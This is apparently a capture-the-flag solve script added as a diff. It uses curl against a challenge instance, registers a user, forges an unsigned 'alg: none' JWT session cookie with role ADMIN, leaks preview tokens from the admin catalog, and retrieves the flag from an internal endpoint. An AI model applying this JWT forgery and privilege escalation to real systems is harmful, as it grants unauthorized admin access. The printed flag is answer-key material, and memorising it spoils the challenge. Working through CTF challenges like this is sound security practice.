@@ -1,0 +1,24 @@
+# Replace BASE with the active instancer host.
+BASE='https://sprout-about-43e04b91a1cd.chals.z0d1ak.org'
+
+# 1. Register a normal user.  The application requires a sproutabout.com
+# address and an exactly 12-character password.
+curl -ksS -i -c cookies.txt -X POST "$BASE/api/auth/register" \
+  --data-urlencode 'email=codax1787416451@sproutabout.com' \
+  --data-urlencode 'password=Codax1234567'
+
+# 2. Decode the sprout_session cookie.  The payload contains role=USER.
+# The accepted exploit replaces the header with {"alg":"none"} and the payload
+# with role=ADMIN, then leaves the signature segment empty.
+
+# 3. Use the forged cookie to open the admin catalog and recover productId /
+# previewToken pairs from the rendered RSC payload.
+curl -ksS --cookie "sprout_session=<unsigned-admin-jwt>" \
+  "$BASE/admin/products"
+
+# 4. Call the internal preview context endpoint with one leaked pair.
+curl -ksS --cookie "sprout_session=<unsigned-admin-jwt>" \
+  "$BASE/api/admin/preview-context?productId=1&previewToken=7421c79a-8dbd-4ec5-8047-b41c437fbe45"
+
+# Response:
+# {"mode":"moderation","finalFlag":"zdk{0C3AN_DLviNG_i5_fUN}","productId":1,"note":"internal-only"}
